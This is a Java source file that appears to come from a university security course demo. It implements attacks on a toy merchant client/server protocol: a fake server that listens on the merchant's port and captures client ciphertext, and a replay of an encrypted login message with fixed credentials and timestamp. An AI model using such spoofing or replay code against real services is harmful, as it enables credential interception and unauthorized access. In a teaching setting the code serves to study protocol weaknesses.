package ece644demo;

import java.io.BufferedInputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.math.BigInteger;
import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.UnknownHostException;
import java.security.InvalidKeyException;
import java.security.KeyFactory;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.PublicKey;
import java.security.spec.InvalidKeySpecException;
import java.security.spec.RSAPublicKeySpec;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;
import java.util.HashMap;
import java.util.LinkedHashMap;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;

public class Attacker {
	static PublicKey merchant_public_key;


	public Attacker() {
		// TODO Auto-generated constructor stub
	}

	public static void main(String[] args) throws UnknownHostException, IOException, ClassNotFoundException, NoSuchAlgorithmException, InvalidKeySpecException, SQLException{
		//login_attack();
		//products_attack();
		Attack_m_c();


	}

	//when server is down
	public static void Attack_m_c() throws IOException{	
		int port_client = 9995;
		ServerSocket msocket = new ServerSocket(port_client);
		Socket ms = null;
		DataInputStream dis = null;
		while(true){
			ms = msocket.accept();
			dis = new DataInputStream(ms.getInputStream());
			byte[] cipherText = null;
			cipherText = new byte[64];
			dis.readFully(cipherText, 0, cipherText.length);
			System.out.println(cipherText);
			int length = 256;
			byte[] cp=null;
			if(length>0) {
				cp = new byte[length];
				dis.readFully(cp, 0, cp.length); // read the message
			}
			System.out.println(cp);
		}
	}

	/*String serverAddress= "192.168.137.1";
		      Socket s = new Socket();//(serverAddress, 9995);
		      s.connect(new InetSocketAddress(serverAddress,9995));  
		      BufferedReader input =
		            new BufferedReader(new InputStreamReader(s.getInputStream()));
		        String answer ;
		        while((answer= input.readLine())!=null)
		        {
		        	System.out.println(answer);
		        }
		}*/


	//products attack
	public static void products_attack() throws ClassNotFoundException, SQLException, NoSuchAlgorithmException{
		Connection c = null;
		Class.forName("org.sqlite.JDBC");
		c = DriverManager.getConnection("jdbc:sqlite:PhoenixDatabase.db");
		c.setAutoCommit(false);
		new Database();
		LinkedHashMap<String, String> products;
		products = Database.get_products(c);

		MessageDigest mdClient = MessageDigest.getInstance("MD5");
		mdClient.update(products.toString().getBytes());
		byte[] messageDigestClientMD5 = mdClient.digest();
		System.out.println("Hash: "+messageDigestClientMD5);
	}

	//login attack
	public static void login_attack() throws ClassNotFoundException, NoSuchAlgorithmException, InvalidKeySpecException, IOException{
		String file_merchant_public_key="serverMerchantPublicKey";
		merchant_public_key=readPublicKey(file_merchant_public_key);
		String hostname = "192.168.137.1";
		int merchant_port = 9995;
		Socket merchantSocket = new Socket(hostname, merchant_port);			
		DataOutputStream dos = new DataOutputStream(merchantSocket.getOutputStream());

		//Login attack
		String identifier = "Login";
		String username = "a";
		String password = "a";
		String email = "a";
		long tsTime_login = 1480559469321L;
		String session_ctom = "-1356733123";

		byte[] cipherTextIdentifier = encrypt(identifier);
		byte[] cipherTextUsername = encrypt(username);
		byte[] cipherTextPassword = encrypt(password);
		byte[] cipherTextEmail = encrypt(email);
		byte[] cipherTextTimeStamp = encrypt(Long.toString(tsTime_login));
		byte[] cipherTextSession_ctom = encrypt(session_ctom);
		int byteArrayLength = cipherTextUsername.length + cipherTextPassword.length +
				cipherTextEmail.length + cipherTextTimeStamp.length + cipherTextSession_ctom.length;
		byte[] bigByteArray = new byte[byteArrayLength];
		System.arraycopy(cipherTextUsername, 0, bigByteArray, 0, cipherTextUsername.length);
		System.arraycopy(cipherTextPassword, 0, bigByteArray, cipherTextUsername.length, cipherTextPassword.length);
		System.arraycopy(cipherTextEmail, 0, bigByteArray, cipherTextUsername.length + cipherTextPassword.length, cipherTextEmail.length);
		System.arraycopy(cipherTextTimeStamp, 0, bigByteArray, cipherTextUsername.length + cipherTextPassword.length + cipherTextEmail.length, cipherTextTimeStamp.length);
		System.arraycopy(cipherTextSession_ctom, 0, bigByteArray, cipherTextUsername.length + cipherTextPassword.length + cipherTextEmail.length + cipherTextTimeStamp.length, cipherTextSession_ctom.length);

		dos.write(cipherTextIdentifier);
		dos.write(bigByteArray);
		dos.flush();
		merchantSocket.close();	
	}

	//function to encrypt details to be sent to merchant
	public static byte[] encrypt(String plainText){
		byte[] cipherTextMerchant = null;
		try {
			Cipher cipherMerchant = Cipher.getInstance("RSA/ECB/PKCS1Padding");
			cipherMerchant.init(Cipher.ENCRYPT_MODE, merchant_public_key);
			cipherTextMerchant = cipherMerchant.doFinal(plainText.getBytes());

		} catch (IllegalBlockSizeException e) {
			e.printStackTrace();
		} catch (InvalidKeyException e) {
			e.printStackTrace();
		} catch (BadPaddingException e) {
			e.printStackTrace();
		} catch (NoSuchAlgorithmException e) {
			e.printStackTrace();
		} catch (NoSuchPaddingException e) {
			e.printStackTrace();
		}

		return cipherTextMerchant;
	}

	//function to get public key
	private static PublicKey readPublicKey(String a) throws IOException, ClassNotFoundException, NoSuchAlgorithmException, InvalidKeySpecException {
		InputStream in = new FileInputStream(a);
		ObjectInputStream oin = new ObjectInputStream(new BufferedInputStream(in));
		try {
			BigInteger m = (BigInteger) oin.readObject();
			BigInteger e = (BigInteger) oin.readObject();
			RSAPublicKeySpec keySpec = new RSAPublicKeySpec(m, e);
			KeyFactory fact = KeyFactory.getInstance("RSA");
			PublicKey pubKey = fact.generatePublic(keySpec);
			return pubKey;
		} finally {
			oin.close();
		}
	}

}
